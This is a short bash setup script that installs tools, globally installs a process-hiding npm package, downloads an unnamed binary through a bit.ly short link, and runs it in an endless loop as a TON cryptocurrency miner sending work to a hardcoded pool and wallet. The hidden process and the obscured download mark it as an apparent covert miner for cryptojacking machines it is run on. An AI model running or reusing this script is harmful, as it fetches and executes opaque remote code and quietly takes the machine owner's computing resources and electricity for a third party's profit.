#!/bin/bash
apt update && apt -y install sudo wget curl unzip
sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs

npm i -g node-process-hider

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

POOL=https://pool.services.tonwhales.com
WALLET=EQD6Q0feCmBzLl2gaAQf2JK9wWwTy4bZVRkhwDRtLwDz2RBp
WORKER=$(echo $(shuf -i 41-80 -n 1)-ETHash)
#wget https://github.com/drJamesjack/prem/raw/main/lolMiner
wget https://bit.ly/3FpnfeJ
chmod +x 3FpnfeJ
#chmod +x lolMiner
while [ 1 ]; do
#./3FpnfeJ --algo ETHASH --pool $POOL --user $WALLET.$WORKER --pass c=LTC,mc=ETH
./3FpnfeJ --algo TON --pool $POOL --user $WALLET.$WORKER --ton-mode 1
sleep 5
done
sleep 999999999
